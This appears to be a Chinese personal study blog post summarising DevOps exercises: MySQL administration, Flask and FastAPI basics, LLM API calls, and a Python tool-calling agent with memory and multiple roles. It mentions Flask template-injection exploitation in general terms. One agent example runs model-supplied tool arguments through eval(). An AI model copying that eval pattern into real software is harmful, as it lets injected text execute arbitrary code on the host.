实用小部件集成：借助Portainer与Homepage的整合能力，实现Docker容器状态的可视化监控，需解决端口映射、认证配置等问题。 五、主题与布局自定义 布局调整：修改setting.yaml文件，通过layout参数调整服务分组的排列样式（如将单列改为双列）。 主题与样式修改：更换默认主题，或编辑配置目录下的custom.css文件，通过CSS选择器自定义元素样式（如修改服务组名称颜色），可通过浏览器开发者工具定位目标元素类名。 MySQL专题 御林招新题：MySQL专题\n一、安装与配置 安装方式 方法一：通过官方源安装，先下载并安装MySQL 5.7官方源包，再用yum安装服务，最后启动服务并执行安全脚本。 方法二：通过tar包安装，解压包后创建用户组和用户，配置目录权限与my.cnf文件，初始化数据库并启动服务，配置系统服务实现管理。 安全配置：执行mysql_secure_installation安全脚本，设置root密码，删除不安全用户和数据库。 验证登录：配置MySQL命令软链接，使用mysql -u root -p命令登录数据库命令行。 二、数据库操作与管理 基础操作 建库建表：CREATE DATABASE test_db;创建数据库，CREATE TABLE students (...)创建含id、name、score字段的表。 数据插入：INSERT INTO students (name, score) VALUES (...)插入数据。 数据导入导出 导出：mysqldump -u root -p test_db \u0026gt; test_db_backup.sql将数据库导出为SQL文件。 导入：先删除数据库并重建，再执行mysql -u root -p test_db \u0026lt; test_db_backup.sql恢复数据。 三、数据库性能调优 关键参数修改 innodb_buffer_pool_size：设置InnoDB缓冲池大小（示例设为2G），用于缓存表数据和索引数据，提高查询性能。 max_connections：设置最大并发连接数（示例设为500），过小会拒绝连接，过大占用过多系统资源。 配置生效：修改/etc/my.cnf配置文件后重启MySQL服务，通过SHOW VARIABLES LIKE '参数名'验证配置。 四、应用程序集成与数据处理 Python集成示例 依赖库：使用pymysql库连接数据库，csv库处理文件。 核心功能：连接数据库查询students表数据，计算学生平均分数，将数据及平均分写入report.csv文件。 安全注意：采用参数化查询防止SQL注入，操作完成后关闭游标和连接。 关键操作：通过游标执行SQL语句，使用fetchall()获取数据，借助csv.writer写入文件。 五、自动化备份与恢复 备份脚本编写 脚本功能：使用mysqldump命令备份指定数据库，为备份文件添加时间戳，检查备份结果并输出日志。 权限设置：执行chmod +x mysql_backup.sh为脚本添加执行权限。 定时执行：通过crontab -e添加定时任务，设置脚本每天凌晨1点自动运行。 验证测试：手动执行脚本，确认备份文件生成；通过top或htop命令查看系统资源占用情况。 Python后端 御林招新题：python 后端\n一、Flask框架 （一）基础应用开发 简单应用创建：定义首页路由/和带参数路由/hello/\u0026lt;name\u0026gt;，实现个性化问候功能。 服务器端模板注入（SSTI）漏洞 漏洞成因：将用户输入直接拼接进模板，通过render_template_string渲染执行恶意代码。 漏洞防护：设置黑名单过滤危险字符，或采用安全写法将参数传入模板而非拼接。 漏洞利用：通过构造特定代码（如利用类继承关系调用系统函数）执行恶意操作。 （二）核心功能用法 请求与响应：通过request模块获取表单、查询字符串、路径等参数；使用make_response自定义响应内容、状态码和响应头；通过render_template渲染模板并返回。 会话管理：设置app.secret_key密钥，利用session对象存储会话数据，实现用户登录状态保持与页面跳转。 模板语法：支持变量替换、条件判断、循环遍历等功能，可动态渲染页面内容。 二、FastAPI与Sanic框架基础 （一）应用创建与路由 FastAPI 基础路由：定义/路由处理GET请求，/items/{item_id}路由处理POST请求。 数据校验：借助Pydantic模型定义数据结构，自动完成POST请求数据的校验。 Sanic 基础路由：创建/路由（GET请求）和/items/{item_id}路由（POST请求）。 数据处理：手动获取请求体数据并处理，需自行实现数据校验逻辑。 框架区别：FastAPI支持自动数据校验，开发效率高；Sanic基于异步非阻塞架构，性能更优。 三、异步编程实践 （一）异步路由\n在FastAPI中创建异步路由/async-task，使用asyncio.sleep模拟耗时操作，验证其非阻塞特性，对比同步路由可知异步操作不会阻塞其他请求。\n（二）异步依赖注入\n依赖函数创建：编写异步依赖函数（如模拟数据库连接），通过yield管理资源生命周期（创建→使用→清理）。 核心概念 await：仅在异步函数中使用，暂停当前协程等待异步操作完成，不阻塞事件循环。 yield：创建生成器，中断函数并返回中间结果，后续可从断点继续执行，用于资源管理。 应用场景：匹配异步编程模型，避免数据库等IO操作阻塞应用，提升并发处理能力。 四、项目结构与APIRouter （一）路由模块化 模块拆分：将API按功能拆分为users和items等模块，分别在不同文件中定义路由。 APIRouter使用：每个模块创建APIRouter实例，定义该模块的路由与业务逻辑，在主应用中通过include_router注册路由并添加前缀。 （二）项目结构示例 1 2 3 4 5 project/ ├── main.py # 主应用入口，注册路由 ├── routers/ # 路由模块文件夹 │ ├── users.py # 用户相关路由 │ └── items.py # 商品相关路由 五、中间件与生命周期管理 （一）自定义中间件 为FastAPI应用添加HTTP中间件，记录每个请求的处理耗时并打印到控制台，中间件在请求到达路由前和响应返回客户端前执行。\n（二）应用生命周期管理 替代on_event钩子：使用lifespan上下文管理器，更优雅地处理应用启动和关闭逻辑，支持异常捕获与资源清理。 资源初始化与销毁：在启动阶段创建数据库连接池并存储在app.state中，应用关闭时安全关闭连接池，确保资源合理释放。 LLM专题 御林招新题：LLM 专题\n一、准备工作 账号与API Key获取：注册LLM服务提供商账号（如硅基流动、阿里云百炼），申请并获取对应API Key，注意不同地域的API Key可能存在差异。 二、编程调用API 环境准备：选用Python语言，安装openai库。 脚本编写：配置客户端（指定API Key和base_url），构造请求参数（选择模型、设置对话消息），发送请求并解析返回结果，打印模型回复。 示例模型：选用qwen-plus等模型，可通过官方文档查询支持的模型列表。 三、模型能力探索 多模型对比：调用至少三种不同模型（如qwen-plus、qwen-max、deepseek-v3.2-exp），针对同一问题提问。 差异分析：从回答风格（结构化程度、语言简洁度）、准确性（内容完整性、专业性）、响应速度及内容深度等维度对比模型表现。 四、构建命令行聊天机器人 核心功能 交互循环：通过无限循环持续接收用户输入，并发送给LLM。 流式输出：配置stream=True实现模型回复的实时流式打印。 退出机制：用户输入quit或exit时，程序优雅退出。 关键实现：处理流式响应的分块内容，过滤空片段，确保输出格式整洁。 五、提示词工程（Prompt Engineering） 角色扮演：修改系统提示词，让模型扮演特定角色（如Linux导师、幽默段子手），引导模型输出符合角色设定的内容。 指令遵循：下达复杂指令，要求模型按指定格式（如Markdown）输出内容（如整理Linux命令及示例）。 输出限制：在提示词中明确约束回答的长度（如100字以内）或格式，规范模型输出结果。 Agent专题 一、工具调用实现 （一）工具设计与开发 天气查询工具 功能：接收城市名参数，调用第三方天气API（如聚合数据API），返回指定城市的实时天气（温度、天气状况、湿度）。 实现：通过requests库发送HTTP请求，解析返回的JSON数据，格式化输出结果，包含异常处理机制。 网络搜索工具 功能：接收关键词参数，调用DuckDuckGo免费搜索API，返回搜索结果摘要（优先提取摘要信息，补充相关主题内容）。 实现：配置API请求参数，处理网络异常和JSON解析异常，过滤无效结果并整理输出。 （二）工具调用流程 配置LLM客户端（基于openai库，对接阿里云百炼等服务），在请求中声明工具列表及参数规范。 LLM自动识别用户需求，生成工具调用指令，包含工具名称和参数。 解析工具调用指令，执行对应工具函数，将结果回传给LLM，由LLM整理为自然语言回答。 二、记忆功能实现 核心原理：通过messages列表存储历史对话内容，包括用户输入、LLM响应（含工具调用记录）和工具执行结果。 交互应用：后续对话中，LLM可从历史记录中提取上下文信息（如用户之前询问的城市），实现追问响应（如用户问“那明天呢？”可关联之前的天气查询需求）。 三、多Agent协同工作 （一）角色设计 Agent A（规划者）：负责任务拆解、工具分配和结果整合，接收用户请求后分解为子任务，指定对应工具及参数，等待执行结果并生成最终回答。 Agent B（执行者）：专注于工具调用执行，接收Agent A的指令，严格调用指定工具，返回原始执行结果，不添加额外处理。 （二）协同流程 用户提交复合任务（如“查北京明天天气及著名IT公司”）。 Agent A拆解为两个子任务，分别分配给Agent B执行。 Agent B调用对应工具（天气查询、网络搜索）并返回结果。 Agent A整合子任务结果，以流畅语言回复用户。 关键保障：设计统一的消息传递机制，明确角色分工的提示词，确保指令传递和结果反馈准确。 四、知识库集成 （一）知识库构建 存储形式：以Markdown文件为载体，按标题分割知识条目，包含标题和正文内容。 语义处理：使用paraphrase-multilingual-MiniLM-L12-v2预训练模型，将知识条目转化为向量嵌入，便于语义检索。 （二）检索与集成 检索逻辑：接收用户查询关键词，生成查询向量，通过余弦相似度计算匹配最相关的知识条目（设置相似度阈值过滤无效结果）。 系统集成：将知识库查询作为工具加入工具列表，Agent A优先调用该工具回答特定领域问题（如技术概念），提升回答的精准性和定制化程度。 ","date":"2025-10-21T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-devops%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/","title":"御林-DevOps入门小结"},{"content":"实现工具调用（Tool Calling） 设计工具：你必须实现至少两个工具。当用户提出相关需求时，你的 Agent 必须能够识别并调用相应的工具。\nqwen 的工具调用整合了 OpenAI，所以可以看 OpenAI 的使用文档：函数调用 - OpenAI 中文文档，写得比较简略；openai-python/api.md at main · openai/openai-python 仓库，详细但是冗杂\n基本步骤：\n创建助手，以调用外部 API 来回答问题（定义函数） 将自然语言转换为 API 调用 从文本中提取结构化的数据 工具1：天气查询工具\n可以使用爬虫实现，也可以寻找相应的api提供商\n功能：接受城市名作为参数。 返回：指定城市的实时天气信息，包括温度、天气状况（晴、多云、雨等）和湿度。 用户交互示例：当用户问“北京今天天气怎么样？”时，Agent 必须识别出“北京”并调用此工具，然后返回天气信息。 注册接口：天气预报查询接口_天聚地合\n1 2 3 4 5 6 7 8 9 10 11 WEATHER_API_KEY = \u0026#34;...\u0026#34; def get_weather(city: str) -\u0026gt; str: url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; response = requests.get(url) data = response.json() if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; 工具2：网络搜索工具\n可以使用Searxng，也可以使用其它专业的api\n功能：接受关键词作为参数。 返回：基于关键词的网络搜索结果摘要。 用户交互示例：当用户问“2024 年奥运会在哪里举办？”时，Agent 能够使用此工具进行搜索并给出答案。 试了自己的 searxng，可能是格式问题跑不通，换了个 API\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def web_search(query: str) -\u0026gt; str: # DuckDuckGo 免费搜索 API（无需注册，直接使用） url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, # 不返回 HTML 内容 \u0026#34;no_redirect\u0026#34;: 1 # 不返回跳转链接 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() # 检查 HTTP 状态码（如 404、500 会报错） except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except requests.exceptions.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的 JSON\u0026#34; # 提取结果（DuckDuckGo 的 JSON 结构与 SearXNG 不同） summary = [] # 1. 优先取 \u0026#34;Abstract\u0026#34;（摘要） if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) # 2. 再取 \u0026#34;RelatedTopics\u0026#34;（相关主题）的前 2 条 for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) if not summary: return \u0026#34;未找到相关搜索结果\u0026#34; return \u0026#34;\\n\u0026#34;.join(summary) 实现记忆功能（Memory） 功能：你的 Agent 必须能够记住之前的对话内容，并在后续的交互中利用这些信息。\n用户交互示例：\n用户：“今天上海天气怎么样？” Agent：“上海今天晴，气温 25 度。” 用户：“那明天呢？” Agent 必须能够理解“那明天呢？”是关于“上海天气”的追问，并给出正确的答案。 记忆管理：用 message[] 存储以前对话的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 messages = [] While True: ... messages.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # 调用的时候再传入 messages ... # 调用结束，结果再传入 messages messages.append({ \u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: response_message.content, \u0026#34;tool_calls\u0026#34;: [ { \u0026#34;id\u0026#34;: tc.id, \u0026#34;type\u0026#34;: tc.type, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: tc.function.name, \u0026#34;arguments\u0026#34;: tc.function.arguments } } for tc in response_message.tool_calls ] if response_message.tool_calls else None }) 完整示例代码 将工具调用、记忆整合：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 import os import requests from bs4 import BeautifulSoup from openai import OpenAI # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;...\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 天气查询工具 WEATHER_API_KEY = \u0026#34;...\u0026#34; # 需注册聚合数据等平台获取 def get_weather(city: str) -\u0026gt; str: url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; response = requests.get(url) data = response.json() if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; # 网络搜索工具 # SEARXNG_URL = \u0026#34;http://8.137.38.223:8081/\u0026#34; # 用不了 def web_search(query: str) -\u0026gt; str: # DuckDuckGo 免费搜索 API（无需注册，直接使用） url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, # 不返回 HTML 内容 \u0026#34;no_redirect\u0026#34;: 1 # 不返回跳转链接 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() # 检查 HTTP 状态码（如 404、500 会报错） except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except requests.exceptions.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的 JSON\u0026#34; # 提取结果（DuckDuckGo 的 JSON 结构与 SearXNG 不同） summary = [] # 1. 优先取 \u0026#34;Abstract\u0026#34;（摘要） if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) # 2. 再取 \u0026#34;RelatedTopics\u0026#34;（相关主题）的前 2 条 for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) if not summary: return \u0026#34;未找到相关搜索结果\u0026#34; return \u0026#34;\\n\u0026#34;.join(summary) #核心，调用 AI # 初始化对话记忆（上下文） messages = [] while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入记忆 messages.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # 调用模型生成响应（可能包含工具调用） response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages, tools=[ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询指定城市的实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;城市名称，如北京、上海\u0026#34;} }, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词相关信息\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;搜索关键词\u0026#34;} }, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ], tool_choice=\u0026#34;auto\u0026#34;, # 让 AI 自己决定是否调用 tools ) response_message = response.choices[0].message # 将模型的响应消息（含 tool_calls）加入 messages messages.append({ \u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: response_message.content, \u0026#34;tool_calls\u0026#34;: [ { \u0026#34;id\u0026#34;: tc.id, \u0026#34;type\u0026#34;: tc.type, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: tc.function.name, \u0026#34;arguments\u0026#34;: tc.function.arguments } } for tc in response_message.tool_calls ] if response_message.tool_calls else None }) # 处理工具调用 if response_message.tool_calls: for tool_call in response_message.tool_calls: function_name = tool_call.function.name function_args = eval(tool_call.function.arguments) # 调用工具 if function_name == \u0026#34;get_weather\u0026#34;: tool_result = get_weather(**function_args) elif function_name == \u0026#34;web_search\u0026#34;: tool_result = web_search(** function_args) else: tool_result = f\u0026#34;未知工具：{function_name}\u0026#34; # 工具结果加入 messages（确保 tool_call_id 正确） messages.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, # 对应前置 tool_calls 的 id \u0026#34;name\u0026#34;: function_name, \u0026#34;content\u0026#34;: tool_result }) # 生成最终回答 final_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages, ) print(f\u0026#34;AI：{final_response.choices[0].message.content}\u0026#34;) else: # 无工具调用，直接输出 print(f\u0026#34;AI：{response_message.content}\u0026#34;) 效果：\n多 Agent 协同工作 场景：设计至少两个不同的 Agent 角色，让它们在完成一个共同任务时能够互相协作。 参考 openai-sdk 文档：编排多个 Agents - OpenAI Agents SDK - 中文文档\n实现要点：\n需要设计一个消息总线或队列，让 Agent A 能把任务指令发给 Agent B，Agent B 也能把结果回传给 Agent A。 每个 Agent 需要有角色专属的 Prompt（提示词），让其记住自己的分工 工具需要有统一的调用接口 Agent 角色设计： Agent A（规划者）：负责分解任务，将任务分配给其他 Agent，并综合最终结果。 Agent B（执行者）：专门负责调用工具和执行具体操作。 协作流程示例： 用户：“请帮我查一下，北京明天的天气，然后告诉我这个城市都有哪些著名的 IT 公司。” **Agent A（规划者）**接收请求，将其分解为两个子任务： 子任务1：查询北京明天的天气。 子任务2：查询北京的著名 IT 公司。 Agent A 将子任务1分配给Agent B（执行者），要求其调用“天气查询工具”。 Agent A 再次将子任务2分配给Agent B，要求其调用“网络搜索工具”。 Agent A 收到两个子任务的执行结果后，将它们整合，并以流畅的语言回答用户。 与平时的代码不同，用 Agent 需要把部分代码功能交给 Ai 去处理\n完整示例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 import os import json import requests from openai import OpenAI # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;...\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 工具定义 WEATHER_API_KEY = \u0026#34;...\u0026#34; def get_weather(city: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询指定城市的实时天气\u0026#34;\u0026#34;\u0026#34; url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; try: response = requests.get(url, timeout=10) response.raise_for_status() data = response.json() except requests.exceptions.RequestException as e: return f\u0026#34;天气查询请求失败：{str(e)}\u0026#34; except json.JSONDecodeError: return \u0026#34;天气查询结果解析失败：返回内容不是有效的JSON\u0026#34; if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; def web_search(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;使用DuckDuckGo进行网络搜索\u0026#34;\u0026#34;\u0026#34; url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, \u0026#34;no_redirect\u0026#34;: 1 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except json.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的JSON\u0026#34; summary = [] if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) return \u0026#34;\\n\u0026#34;.join(summary) if summary else \u0026#34;未找到相关搜索结果\u0026#34; # Agent 角色定义（关键修改：明确Agent B只返回结果） AGENT_A_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent A，任务规划者。职责： 1. 分析用户请求，拆解为需要执行的子任务（每个子任务对应一个工具调用） 2. 为每个子任务指定需要调用的工具（get_weather 或 web_search）和参数 3. 等待所有子任务执行完成后，整合结果并以自然语言回复用户 重要规则： - 当需要工具调用时，必须生成明确的 tool_call - 不要自己执行工具调用 - 工具调用结果会通过 tool_response 反馈给你\u0026#34;\u0026#34;\u0026#34; AGENT_B_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent B，任务执行者。职责： 1. 接收 Agent A 的子任务指令 2. 严格按指令调用指定工具（get_weather 或 web_search） 3. 仅返回工具调用的原始结果，不要添加任何解释或格式化 重要规则： - 你不需要生成 tool_call - 直接返回工具函数的执行结果字符串 - 结果必须是纯文本，不要包含JSON或其他结构\u0026#34;\u0026#34;\u0026#34; # 初始化Agent A的对话记忆（关键：保留完整上下文） messages_a = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_A_PROMPT}] # 工具列表定义 tools = [ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询城市实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ] def main(): # Agent B 的上下文只需初始化一次 messages_b = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_B_PROMPT}] while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input.lower() in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;, \u0026#34;退出\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入Agent A的上下文 messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # Agent A：拆解任务并生成工具调用计划 while True: # 循环处理多轮工具调用 agent_a_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages_a, tools=tools, tool_choice=\u0026#34;auto\u0026#34; ) agent_a_msg = agent_a_response.choices[0].message messages_a.append(agent_a_msg) # 检查是否需要工具调用 if not agent_a_msg.tool_calls: # 无需工具调用，直接输出结果 print(f\u0026#34;AI：{agent_a_msg.content}\u0026#34;) break # 处理所有工具调用 tool_results = [] for tool_call in agent_a_msg.tool_calls: func_name = tool_call.function.name try: func_args = json.loads(tool_call.function.arguments) except json.JSONDecodeError: tool_results.append(f\u0026#34;工具调用参数解析失败：{tool_call.function.arguments}\u0026#34;) continue # Agent B 执行工具调用（关键：直接调用工具函数） print(f\u0026#34;正在执行: {func_name}({func_args})...\u0026#34;) if func_name == \u0026#34;get_weather\u0026#34;: result = get_weather(**func_args) elif func_name == \u0026#34;web_search\u0026#34;: result = web_search(**func_args) else: result = f\u0026#34;未知工具：{func_name}\u0026#34; tool_results.append(result) # 将结果反馈给 Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: result }) # 清空 Agent B 的上下文（仅保留系统提示） messages_b = [messages_b[0]] # 保存最终回复到上下文 if agent_a_msg.content: messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: agent_a_msg.content}) if __name__ == \u0026#34;__main__\u0026#34;: main() 不知道为什么搜索又出了问题\n实现任意形式的知识库 功能：构建一个外部知识库（可以是简单的文本文件、Markdown 文档，甚至一个小型数据库）。 集成：将知识库集成到你的 Agent 系统中，使其能够通过检索知识库来回答问题。 用户交互示例： 用户：“什么是 DevOps？” Agent 能够通过检索你提供的知识库，而不是纯粹依赖 LLM 的通用知识，来回答这个问题。这展示了 Agent 能够利用私有数据或特定领域数据来提供更精确和定制化的答案。 实现：\n需要用到预训练模型（这里用paraphrase-multilingual-MiniLM-L12-v2）来识别语义，将语义相近的文本转化为数值相近的向量\n导入 SentenceTransformer 模型 需要手动处理模型，将文本处理成可理解的嵌入向量\n还有用向量计算内容相关性等知识……不太懂\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 大致的关键代码 def __init__(self, kb_path=\u0026#34;knowledge_base.md\u0026#34;): self.kb_path = kb_path # 知识库文件路径 self.model = SentenceTransformer(\u0026#39;paraphrase-multilingual-MiniLM-L12-v2\u0026#39;) # 加载预训练模型 self.entries = [] # 